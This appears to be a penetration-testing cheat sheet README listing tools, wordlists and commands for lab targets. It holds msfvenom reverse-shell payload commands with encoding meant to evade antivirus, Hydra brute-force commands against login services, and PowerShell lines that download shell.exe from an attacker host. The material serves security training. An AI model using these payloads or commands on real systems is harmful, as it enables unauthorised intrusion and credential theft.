<p align="center">
  <img src="https://user-images.githubusercontent.com/87951795/126915552-127cb983-1670-4561-957f-65f449103882.gif" alt="animated" />
</p>

## Virtual Machines
- https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
- https://docs.rapid7.com/metasploit/setting-up-a-vulnerable-target
  - https://docs.rapid7.com/metasploit/setting-up-a-vulnerable-target
  - Metasploitable2 (Linux): https://sourceforge.net/projects/metasploitable/

## Pentesting Resources
https://github.com/swisskyrepo/PayloadsAllTheThings  
https://pentestmonkey.net/  

## Reverse Shell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet    

## Wordlists  
https://github.com/danielmiessler/SecLists   
https://wordlists.assetnote.io/   
https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm   

## PEASS-ng Privilege Escalation Scripts
https://github.com/carlospolop/PEASS-ng  

## Linux - Privilege Escalation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 
## Linux Tools- Privilege Escalation
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS  
https://github.com/rebootuser/LinEnum  
https://github.com/diego-treitos/linux-smart-enumeration  
https://github.com/TH3xACE/SUDO_KILLER  
https://github.com/AlessandroZ/BeRoot  
https://github.com/pentestmonkey/unix-privesc-check  
https://github.com/sleventyeleven/linuxprivchecker  

## Port Forwarding
In some instances, a root process may be bound to an internal port, through which it communicates.
If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:
- R is a remote tunnel (Debian --> Kali)
```
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```
- L is a local tunnel (Kali --> Debian)
```
ssh -L 10000:localhost:10000 <username>@<ip>
```
The exploit code can now be run on your local machine at whichever port you chose.

## msfvenom
```
msfvenom -l payloads
msfvenom -l formats
```
Generate a payload
```
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker PORT> -f <format> -o <output payload file name>
```
This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```
Comon payloads
- Meterpreter
```
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
```
- Staged (x86 in the list)
```
linux/x86/shell/bind_tcp
linux/x86/shell/reverse_tcp
windows/shell/bind_tcp
windows/shell/reverce_tcp
```
- Stageless (x86 in the list) (The most compact payloads)
```
linux/x86/shell_reverse_tcp
linux/x86/shell_bind_tcp
windows/shell_bind_tcp
windows/shell_reverse_tcp
```
Multi Handler
```
use exploit/multi/handler
```

## Gobuster
https://github.com/OJ/gobuster
```
gobuster dir -u [http://<ip>:<port> or domain] -w <word list location>
```
/robots.txt
recomendet list https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt

## Hidra
FTP:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.13.37 ftp -o ftp-result.txt
```
TELNET:
```
hydra -L /usr/share/wordlists/common-usernames -P /usr/share/wordlists/rockyou.txt 192.168.13.37 telnet
```
SSH:
```
hydra -l <username> -P <full path to pass> 10.10.85.12 -t 4 ssh
```
Web Post Form:  
http-post-form - Note: You’ll need to enter https if you’re attacking a site on port 443.  
```
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"

hydra -l <username> -P <wordlist> 10.10.85.12 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

hydra -l admin -P /usr/share/wordlists/rockyou.txt   10.10.118.158 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=0%2FMGgWbIzIRgqhDCtNxWFt4Tc9qyY5a9TZRKNvqhCwYMrXGMAYBZml7vdDtpwP0Gs8B%2BJALyjKTCEIMk6xYFrbTt622CVKylB7FK8oaJLlg%2B%2FOWgr9%2BL3PHbrUzQH8wLnV%2FN%2Bj3Rye5w9YS36Ier%2BWkL27YST5VvFpvoG1xcn5uuHXo85zrG7bjPB9L9QpmoOkalVM7PN3AlHN9ZF%2BQo6UuS8pNePHcNagYeWoQ47VqMO1yj8gKtcIj6mX0cXJ1U2FqAyInk%2BcMtIRceh69zAUdKnyp85tlaS9%2FFcmUXlN1922ZFAaCintSprVFHb6IXZOVLnvuTMhaCWBm6HtcIju7Vk4p1DHvB9pXEWZf5%2FawRBnRc&__EVENTVALIDATION=YRuRYPS0n%2FeTLUd5sdh31ZXHxhW6Xh%2BepJW9H2xkRVVZOZfo9IpP6Rui2nn%2ByuZpCCnOkSEhE%2Fd8%2FwZ4EZ6N7lOobh%2FU8pDcxVHXTdgKuELMtvwy6BGJkNTqV8dIK47bernMdrk22BfWb0DA1a%2Brp5NvMYgH8AG8NI2JL6x7YfE0Oj0o&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
```

## Windows 
- Dump the metarpreter hear
  - C:\Windows\Temp
```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.192.186:8080/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

shell
powershell -c "Invoke-WebRequest -Uri 'http://10.10.192.186:8080/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
exit
```

- https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- https://github.com/samratashok/nishang
  - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1


## Unix Binaries (Used to bypass security restrictions)
https://gtfobins.github.io/

## Identify technologies on websites 
https://www.wappalyzer.com/apps

## Free Password Hash Cracker  
https://crackstation.net/    

## Hash identifier
https://gitlab.com/kalilinux/packages/hash-identifier/  

## File Shering Services
https://siasky.net/  

## HackTricks hacking trick/technique/whatever
https://book.hacktricks.xyz/

## Serving Files From Your Host
```
python3 -m  http.server 8080
```
UpDog a more advance webserver: 
https://github.com/sc0tfree/updog  

If we know ssh  
```
scp [File] [User]@[IP]:/dev/shm
```

## Nmap
```
nmap -sC -sV -oN initialScan [IP]/24
```

## Enum4linux
Enum4linux is a tool for enumerating information from Windows and Samba systems
```
 enum4linux -a [IP]
```

## Windows deep clean 
https://old.reddit.com/r/TronScript/  
- Download Tron. The download links are in the top post in /r/TronScript. If you download the self-extracting .exe file, run it and it will extract tron.bat and the \resources folder to the current directory. Copy both of them to the Desktop of the target machine.

- Tron can be run with Windows in either Safe Mode or Regular mode. Regular mode is generally recommended unless the system is severly infected.

- Right-click tron.bat and select "Run as Administrator"

## MacOS Security
https://objective-see.com/

## Shodan.io
Search for vulnerable devices (can check your own ip)  
https://www.shodan.io/
